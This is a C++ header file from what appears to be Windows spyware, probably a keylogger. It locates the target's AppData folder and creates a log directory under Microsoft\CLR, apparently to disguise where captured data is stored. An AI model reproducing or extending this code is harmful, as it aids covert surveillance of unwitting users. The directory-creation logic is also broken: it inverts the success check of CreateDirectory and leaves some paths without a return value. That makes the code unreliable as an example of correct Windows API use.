#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include <Windows.h>
#include "Auxiliary.h"
#include "Transformer.h"

/*

This header file will include the functionality used to interact with the targets filesystem and assist
in the discovery of paths and the creation of files as well as writing to them

*/

using std::cout;

namespace IO
{

	// Method prototypes for improved readability

	std::string getAppDataPath(const bool appendSeperator = false);
	bool createDirectory(std::string dirPath);

	// This function uses stdlib to query the windows env variables and retrieves the path to the AppData folder

	std::string getAppDataPath(const bool appendSeperator)
	{
		std::string appdataDir = getenv("APPDATA");
		std::string fullPath = appdataDir + "\\Microsoft\\CLR";
		return fullPath + (appendSeperator ? "\\" : "");
	}

	// The function below will create a new directory within wich we will store our logs

	bool createDirectory(std::string dirPath)
	{
		/* 
		
		All this mumbo jumbo to convert the string object passed in 
		into a LPCWSTR which the WinAPI function accepts
		
		*/

		std::wstring tmp = std::wstring(dirPath.begin(), dirPath.end());
		LPCWSTR dirPath2 = tmp.c_str();

		/* 
		
		This if funnel simply deals with the result of trying to create a directory
		
		If it is successful, then return true, if the target directory already exists, 
		then also return true, however, if the target path could not be located, then return false
		
		*/

		if (CreateDirectory(dirPath2, NULL) == 0)
		{
			Auxiliary::logError("IO::createDirectory() - Directory created!");
			return true;
		}
		else if(GetLastError() == ERROR_ALREADY_EXISTS)
		{
			Auxiliary::logError("IO::createDirectory() - Directory already exists!");
			return true;
		}
		else if (GetLastError() == ERROR_PATH_NOT_FOUND)
		{
			Auxiliary::logError("IO::createDirectory() - Directory path not found!");
			return false;
		}
	}
}

#endif // !IO_H
